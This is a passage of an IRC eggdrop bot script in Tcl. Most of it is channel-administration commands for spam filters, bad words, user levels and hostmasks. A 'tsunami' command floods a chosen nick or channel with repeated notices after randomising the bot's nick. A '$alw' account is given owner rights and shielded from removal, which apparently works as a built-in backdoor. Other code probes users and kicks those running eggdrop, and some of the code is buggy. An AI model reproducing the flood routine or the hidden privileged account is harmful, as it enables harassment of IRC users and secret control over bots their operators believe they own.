  set cflag [string range $cflag 0 8]
  chattr $cflag -P
  setuser $cflag XTRA "JP" ""
  puthlp "NOTICE $nick :$notc JoINPaRT $chan \[4OFF\]"
  saveuser
}
## +/- massjoin
bind pub Z `+massjoin pub_+massjoin
proc pub_+massjoin {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    foreach x [userlist A] { chattr $x +J }
    puthlp "NOTICE $nick :$notc ALL MaSsJoIN CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[matchattr $cflag J]} { puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[9ON\]" ; return 0 }  
  chattr $cflag +J
  puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[9ON\]"
  saveuser
}
bind pub Z `-massjoin pub_-massjoin
proc pub_-massjoin {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} { foreach x [userlist A] { chattr $x -J } ; puthlp "NOTICE $nick :$notc ALL MaSsJoIN CHaNNeL \[9ON\]" ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $cflag J]} { puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[4OFF\]" ; return 0 }  
  chattr $cflag -J
  puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[4OFF\]"
  saveuser
}
## +/- spam
bind msg Z +spam pub_+spam
bind pub Z `+spam pub_+spam
proc pub_+spam {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    foreach x [userlist A] { chattr $x +S }
    puthlp "NOTICE $nick :$notc ALL SpaM CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[matchattr $cflag S]} { puthlp "NOTICE $nick :$notc SpaM $chan \[9ON\]" ; return 0 }  
  chattr $cflag +S
  puthlp "NOTICE $nick :$notc SpaM $chan \[9ON\]"
  saveuser
}
bind msg Z -spam pub_-spam
bind pub Z `-spam pub_-spam
proc pub_-spam {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} { foreach x [userlist A] { chattr $x -S } ; puthlp "NOTICE $nick :$notc ALL SpaM CHaNNeL \[4OFF\]" ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $cflag S]} { puthlp "NOTICE $nick :$notc SpaM $chan \[4OFF\]" ; return 0 }  
  chattr $cflag -S
  puthlp "NOTICE $nick :$notc SpaM $chan \[4OFF\]"
  saveuser
}

## +/- key
bind pub Z `+key pub_+key
proc pub_+key {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set rest [lindex $rest 0]
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage +key <word>" ; return 0 }
  chattr $cflag +K
  setuser $cflag XTRA "CI" [zip $rest]
  puthlp "NOTICE $nick :$notc KeY $chan \[9$rest\]"
  saveuser
}
bind pub Z `-key pub_-key
proc pub_-key {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -K
  setuser $cflag XTRA "CI" ""
  puthlp "NOTICE $nick :$notc KeY $chan \[4OFF\]"
  saveuser
}
## +/- revenge
bind msg Z +revenge pub_+revenge
bind pub Z `+revenge pub_+revenge
proc pub_+revenge {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag +D
  puthlp "NOTICE $nick :$notc revenge $chan \[9ON\]"
  saveuser
}
bind msg Z -revenge pub_-revenge
bind pub Z `-revenge pub_-revenge
proc pub_-revenge {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -D
  puthlp "NOTICE $nick :$notc revenge $chan \[4OFF\]"
  saveuser
}
## +/- badword
bind msg Z +badword pub_+badword
bind pub Z `+badword pub_+badword
proc pub_+badword {nick uhost hand chan rest} {
  global badwords notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: `+badword <badword>" ; return 0 }
  if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} { puthlp "NOTICE $nick :$notc [lindex $rest 0] Allready Added" ; return 0 }
  append badwords " [string tolower [lindex $rest 0]]"
  setuser "config" XTRA "BADWORDS" $badwords
  saveuser
  puthlp "NOTICE $nick :$notc Added [lindex $rest 0] to badwords"
  return 0
}
bind msg Z -badword pub_-badword
bind pub Z `-badword pub_-badword
proc pub_-badword {nick uhost hand chan rest} {
  global badwords notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: `-badword <badword>" ; return 0 }
  set val ""
  foreach badword [string tolower $badwords] { if {[string tolower [lindex $rest 0]] == $badword} { puthlp "NOTICE $nick :$notc Removed [lindex $rest 0]" } else { append val " $badword " } }
  set badwords $val
  setuser "config" XTRA "BADWORDS" $val
  saveuser
  return 0
}
## badword
bind pub Z `badwords pub_badwords
proc pub_badwords {nick uhost hand chan rest} {
  global badwords notc 
  set retval "BaDWoRDS: "
  foreach badword [string tolower $badwords] { append retval "$badword " }
  puthlp "NOTICE $nick :$notc $retval"
  return 0
}
## advword
bind pub Z `advwords pub_advwords
proc pub_advwords {nick uhost hand chan rest} {
  global advwords notc
  set retval "adVWoRDS: "
  foreach advword [string tolower $advwords] { append retval "$advword " }
  puthlp "NOTICE $nick :$notc $retval"
  return 0
}
bind msg Z +advword pub_+advword
bind pub Z `+advword pub_+advword
proc pub_+advword {nick uhost hand chan rest} {
  global advwords notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: `+advword <advword>" ; return 0 }
  if {[string match "*[string tolower [lindex $rest 0]]*" $advwords]} { puthlp "NOTICE $nick :$notc [lindex $rest 0] allready added" ; return 0 }
  append advwords " [string tolower [lindex $rest 0]]"
  setuser "config" XTRa "aDVWORDS" $advwords
  saveuser
  puthlp "NOTICE $nick :$notc added [lindex $rest 0] to advwords"
  return 0
}
bind msg Z -advword pub_-advword
bind pub Z `-advword pub_-advword
proc pub_-advword {nick uhost hand chan rest} {
  global advwords notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: `-advword <advword>" ; return 0 }
  set val ""
  foreach advword [string tolower $advwords] { if {[string tolower [lindex $rest 0]] == $advword} { puthlp "NOTICE $nick :$notc Removed [lindex $rest 0]" } else { append val " $advword " } }
  set advwords $val
  setuser "config" XTRa "aDVWORDS" $val
  saveuser
  return 0
}
## nobot
bind pub Z `nobot pub_bobot
proc pub_nobot {nick uhost hand chan rest} {
  global botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {![isop $botnick $chan]} { return 0 }
  if {[isutimer "pub_nobot"]} { return 0 }
  if {[rand 2] <= 1} { puthlp "PRIVMSG $chan :\001USERINFO\001" } { puthlp "PRIVMSG $chan :\001CLIENTINFO\001" }
  return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc ui_reply {nick uhost hand dest key arg} {
  global botnick bannick notc ismaskhost
  if {![string match "*eggdrop*" $arg]} { return 0 }
  if {$nick == $botnick || [matchattr $nick f]} { return 0 }
  foreach x [channels] {
    if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
      if {[info exists ismaskhost]} { set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"] } { set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]" }
      putsrv "KICK $x $nick :[lgrnd] 4!14alert4! 4$x14 forbidden for 4eggy14 due to lame anticipated [banmsg]"
      return 0
} } }
## sdeop
bind pub Z `sdeop pub_sdeop
proc pub_sdeop {nick uhost hand chan rest} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan $rest }
  if {[isop $botnick $chan]} { puthelp "mode $chan +v-ko $botnick 14a4dmin.14r4equest $botnick" }
}
## chanmode
bind msg Z `chanmode pub_chanmode
bind pub Z `chanmode pub_chanmode
proc pub_chanmode {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic" ; return 0 }
  if {[string index [lindex $rest 0] 0] == "#"} {
    if {![validchan [lindex $rest 0]]} { puthlp "NOTICE $nick :$notc NoT IN [lindex $rest 0]" ; return 0 }
    set chan [lindex $rest 0] ; set rest [lrange $rest 1 end]
  }
  if {![validchan $chan]} { puthlp "NOTICE $nick :$notc $chan <n/a>" } else { catch { channel set $chan chanmode $rest }
    savechan
    puthelp "NOTICE $nick :$notc $chan set modes \[$rest\]"
  }
  return 0
}
## chanset
bind msg Z `chanset pub_chanset
bind pub Z `chanset pub_chanset
proc pub_chanset {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set channel [lindex $rest 0]
  set options [string tolower [lindex $rest 1]]
  set number "0"
  if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} { set number [lindex $rest 2] }
  if {($channel == "") || ($options == "")} { puthlp "NOTICE $nick :$notc Usage: chanset #channel <option...>" ; return 0 }
  if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} { puthlp "NOTICE $nick :$notc Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:seconds>" ; return 0 }
  if {[validchan $channel]} {
    if {$options == "deop"} { catch { channel set $channel flood-deop $number } ; puthlp "NOTICE $nick :$notc set deop flood \[$number\] on $channel"
      } elseif {$options == "kick"} { catch { channel set $channel flood-kick $number } ; puthlp "NOTICE $nick :$notc set kick flood \[$number\] on $channel"
      } elseif {$options == "join"} { catch { channel set $channel flood-join $number } ; puthlp "NOTICE $nick :$notc set join flood \[$number\] on $channel"
      } elseif {$options == "line"} { catch { channel set $channel flood-chan $number } ; puthlp "NOTICE $nick :$notc set line flood \[$number\] on $channel"
      } elseif {$options == "nick"} { catch { channel set $channel flood-nick $number } ; puthlp "NOTICE $nick :$notc set nick flood \[$number\] on $channel"
      } elseif {$options == "ctcp"} { catch { channel set $channel flood-ctcp $number } ; puthlp "NOTICE $nick :$notc set ctcp flood \[$number\] on $channel"
    } else { catch { channel set $channel ${options} } ; puthelp "NOTICE $nick :$notc Successfully set modes \[${options}\] on $channel" ; savechan }
  } else { puthlp "NOTICE $nick :$notc $channel <n/a>"  }
}
## chansetall
bind msg Z `chansetall pub_chansetall
bind pub Z `chansetall pub_chansetall
proc pub_chansetall {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: chansetall <option>" ; return 0 }
  foreach x [channels] { catch { channel set $x $rest } }
  savechan
  puthelp "NOTICE $nick :$notc Set all channels mode \{ $rest \}"
  return 0
}
## chanreset
bind msg Z `chanreset pub_chanreset
bind pub Z `chanreset pub_chanreset
proc pub_chanreset {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: chanreset <#|ALL>" ; return 0 }
  set chan [lindex $rest 0]
  if {[string tolower $chan] == "all"} {
    puthlp "NOTICE $nick :$notc ReSeT ALL DeFauLT FLAg"
    foreach x [channels] {
      catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 -noawayop -idleop -unidentifyop }
      catch { channel set $x -nodesynch +trojan +echox -split }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hp+AJSPTRUED"
      setuser $cflag XTRA "JP" 5
      setuser $cflag XTRA "CHAR" 250
      setuser $cflag XTRA "RPT" 2
      setuser $cflag XTRA "CAPS" 80
    }
    savechan
    return 0
  }
  if {[string first # $chan]!=0} { set chan "#$chan" }
  puthlp "NOTICE $nick :$notc ReSeT cHaNNeL \[$chan\] DeFauLT FLAg"
  if {![validchan $chan]} { puthlp "NOTICE $nick :$notc UnFIndEd $chan." ; return 0 }
  catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  catch { channel set $chan -nodesynch +trojan +echox -split }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hp+AJSPTRUED"
  setuser $cflag XTRA "JP" 5
  setuser $cflag XTRA "CHAR" 250
  setuser $cflag XTRA "RPT" 2
  setuser $cflag XTRA "CAPS" 80
  savechan
}
## tsunami
bind pub - `tsunami pub_tsunami
proc pub_tsunami {nick uhost hand channel rest} {
  global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick alw
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  if {$person == $botnick} { return 0 }
  if {[string index $person 0] == "#"} {
    if {[validchan $person]} {
      if {[isop $botnick $person] && ![matchattr $nick m]} {
        if {[isutimer "IN PROGRESS"]} { return 0 }
        utimer 20 [list putlog "IN PROGRESS"]
        putsrv "KICK $channel $nick :[lgrnd] 4!14spam4! 14channel 4flood14 protection [banmsg]"
        return 0
  } } }
  if {[matchattr $person n] && ![matchattr $nick Z]} {
    if {[isop $botnick $channel]} { putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14admin 4flood14 protection [banmsg]" }
    if {[istimer "IN PROGRESS"]} { return 0 }
    timer 2 [list putlog "IN PROGRESS"]
    putsrv "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    return 0
  }
  if {![matchattr $nick Z]} { return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: tsunami <nick/#> <msg>" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {[string tolower $person] == [string tolower $alw]} { return 0 }
  if {[string index $person 0] == "#"} {
    if {![validchan $person]} {
      pub_randnick $nick $uhost $hand $channel ""
      set cmd_chn $person
      set cmd_msg $rest
      set cmd_by $nick
      set cmd_case "1"
      channel add $person
      catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
      return 0
  } }
  catch { clearqueue all }
  pub_randnick $nick $uhost $hand $channel ""
  if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
  if {$quick == "1"} {
    putqck "PRIVMSG $person :$rest,"
    putqck "NOTICE $person :$rest,"
  }
  putsrv "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  utimer 10 { puthlp "AWAY" }
  utimer 120 goback
  return 0
}
## deluser
bind msg Z `deluser pub_deluser
bind pub Z `deluser pub_deluser
proc pub_deluser {nick uhost hand channel rest} {
  global botnick alw owner notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: deluser <nick>" ; return 0 }
  set who [lindex $rest 0]
  if {[string tolower $who] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {$who == $owner} { puthlp "NOTICE $nick :$notc YoU CaNT DeLeTE $owner..!" ; return 0 }
  if {$who == ""} { puthlp "NOTICE $nick :$notc Usage: -user <nick>" 
    } else { if {![validuser $who]} { puthlp "NOTICE $nick :$notc <n/a>" 
      } else { if {[matchattr $who n]} { puthlp "NOTICE $nick :$notc You cannot DeLETE a bot owner." 
        } else { if {([matchattr $who m]) && (![matchattr $nick n])} { puthlp "NOTICE $nick :$notc You don't have access to DeLETE $who!" 
        } else { deluser $who ; saveuser ; puthlp "NOTICE $nick :$notc $who DeLETE." }
} } } }
## restart
bind msg Z `restart pub_restart
bind pub Z `restart pub_restart
proc pub_restart {nick uhost hand chan rest} {
  global botnick notc alw owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ReStart Me" ; return 0 }
  set curtime [ctime [unixtime]]
  if {$rest != ""} { set rest " $rest" }
  putsrv "QUIT :$notc ReSTaRT ReQuesT By \[ $nick \]$rest) (14on $curtime"
  return 0
}
## +/- owner
bind msg Z `+owner pub_+owner
bind pub Z `+owner pub_+owner
proc pub_+owner {nick uhost hand channel param} {
  global botnick alw notc owner 
  set rest [lindex $param 0]
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER can ADD OwnER" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +owner <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc ADD \[$rest\] OwNER LIsT." ; return 0 }
  if {[matchattr $rest Z]} { puthlp "NOTICE $nick :$notc $rest is already exist on OwNER list." ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 !BLoCkEd!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask }
  chattr $rest "fjmnotxZ"
  if {![validuser $rest]} { puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest return 0
    } else {
    saveuser
    puthlp "NOTICE $nick :$notc ADD \[$rest\] OwNER LIsT."
    puthlp "NOTICE $rest :$notc $nick ADD YoU To OwNER LIsT"
    puthlp "NOTICE $rest :$notc /msg $botnick pass <password>"
    return 0
} }
bind msg Z `-owner pub_-owner
bind pub Z `-owner pub_-owner
proc pub_-owner {nick uhost hand channel param} {
  global notc alw owner
  set rest [lindex $param 0]
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER caN DeLete OwnER" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -owner <nick>" ; return 0 }
  if {![validuser $rest]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, $rest IS NoT OwNER" ; return 0 }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM OwNER LiST"
}
### +/- admin
bind msg Z `+admin pub_+admin
bind pub Z `+admin pub_+admin
proc pub_+admin {nick uhost hand channel param} {
  global botnick alw notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +ADmIN <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc ADD \[$rest\] Admin List." ; return 0 }
  if {[matchattr $rest n]} { puthlp "NOTICE $nick :$notc $rest is already exist on Admin list." ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 BLocKEd..!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask }
  chattr $rest "fjmnotx"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
    deluser $rest
    return 0
    } else {
    saveuser
    puthlp "NOTICE $nick :$notc ADD \[$rest\] ADmIN List."
    puthlp "NOTICE $rest :$notc $nick ADD YoU To ADmIN LIsT"
    puthlp "NOTICE $rest :$notc /msg $botnick pass <password>"
    return 0
} }
bind msg Z `-admin pub_-admin
bind pub Z `-admin pub_-admin
proc pub_-admin {nick uhost hand channel param} {
  global alw notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -ADmIN <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc 4DeNiEd!, <n/a>" ; return 0 }
  if {![matchattr $rest n]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, $rest is not exist on ADmIN list." ; return 0 }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM ADmIN LIsT"
}
## +/- aop
bind msg Z `+aop pub_+aop
bind pub Z `+aop pub_+aop
proc pub_+aop {nick uhost hand channel param} {
  global alw notc botnick chk_reg
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +aop <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc ADD \[$rest\] To a@p LIsT" ; return 0 }
  if {[matchattr $rest P]} { puthlp "NOTICE $nick :$notc $rest is already a@p" ; return 0 }  
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 !BLoCkEd!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" }
  chattr $rest "P"
  if {![validuser $rest]} { puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest 
    } else {
    saveuser
    puthlp "NOTICE $nick :$notc ADD \[$rest\] To a@p LIsT"
    puthlp "NOTICE $rest :$notc $nick ADD YoU To a@p LIsT"
    set chk_reg($rest) $nick
    putsrv "WHOIS $rest"
  }
  return 0
}
bind msg Z `-aop pub_-aop
bind pub Z `-aop pub_-aop
proc pub_-aop {nick uhost hand channel param} {
  global notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -aop <nick>" ; return 0 }
  if {![matchattr $rest P]} { puthlp "NOTICE $nick :$notc $rest is not a@p" ; return 0 }  
  if {![validuser $rest] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc4 !DeNiEd!, <n/a>" ; return 0 }  
  chattr $rest "-P"
  saveuser
  puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM a@p LIsT"
  return 0
}
## +/- host
set thehosts {
  *@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.* *!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org *!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
  *!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu *!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk *!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
  *!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to *!*@*to *@*.to *@*to
}
bind msg Z `+host pub_+host
bind pub Z `+host pub_+host
proc pub_+host {nick uhost hand chan rest} {
  global thehosts botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set who [lindex $rest 0]
  set hostname [lindex $rest 1]
  if {($who == "") || ($hostname == "")} { puthlp "NOTICE $nick :$notc Usage: +host <nick> <new hostmask>" ; return 0 }
  if {![validuser $who]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, <n/a>" ; return 0 }
  set badhost 0
  foreach * [getuser $who HOSTS] { if {${hostname} == ${*}} { puthlp "NOTICE $nick :$notc That hostmask is already there." ; return 0 } }
  if {($who == "") && ($hostname == "")} { puthlp "NOTICE $nick :$notc Usage: +host <nick> <new hostmask>" ; return 0 }
  if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} { if {[string index $hostname 0] != "*"} { set hostname "*!*@*${hostname}" } else { set hostname "*!*@${hostname}" } }
  if {([string match *@* $hostname]) && (![string match *!* $hostname])} { if {[string index $hostname 0] == "*"} { set hostname "*!${hostname}" } else { set hostname "*!*${hostname}" } }
  if {![validuser $who]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, <n/a>" ; return 0 }
  if {(![matchattr $nick n]) && ([matchattr $who n])} { puthlp "NOTICE $nick :$notc Can't add hostmasks to the bot owner." ; return 0 }
  foreach * $thehosts { if {${hostname} == ${*}} { puthlp "NOTICE $nick :$notc Invalid hostmask!" ; set badhost 1 } }
  if {$badhost != 1} {
    if {![matchattr $nick m]} { if {[string tolower $hand] != [string tolower $who]} { puthlp "NOTICE $nick :$notc You need '+m' to change other users hostmasks" ; return 0 } }
    setuser $who HOSTS $hostname
    puthlp "NOTICE $nick :$notc Added \002\[\002${hostname}\002\]\002 to $who."
    if {[matchattr $who a]} { opq $chan $who }
    saveuser
} }
bind msg Z `-host pub_-host
bind pub Z `-host pub_-host
proc pub_-host {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set who [lindex $rest 0]
  set hostname [lindex $rest 1]
  set completed 0
  if {($who == "") || ($hostname == "")} { puthlp "NOTICE $nick :$notc Usage: -host <nick> <hostmask>" ; return 0 }
  if {![validuser $who]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {(![matchattr $nick n]) && ([matchattr $who n])} { puthlp "NOTICE $nick :$notc Can't remove hostmasks from the bot owner." ; return 0 }
  if {![matchattr $nick m]} { if {[string tolower $hand] != [string tolower $who]} { puthlp "NOTICE $nick :$notc You need '+m' to change other users hostmasks" ; return 0 } }
  foreach * [getuser $who HOSTS] { if {${hostname} == ${*}} { delhost $who $hostname ; saveuser ; puthlp "NOTICE $nick :$notc Removed \002\[\002${hostname}\002\]\002 from $who." ; set completed 1 } }
  if {$completed == 0} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, <n/a>" }
}
## +/- gnick
bind msg Z `+gnick pub_+gnick
bind pub Z `+gnick pub_+gnick
proc pub_+gnick {nick uhost hand channel param} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +gnick <nick>" ; return 0 }
  if {[matchattr $rest G]} { puthlp "NOTICE $nick :$notc $rest ready..!" ; return 0 }  
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 !BLocK!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" }
  chattr $rest +G
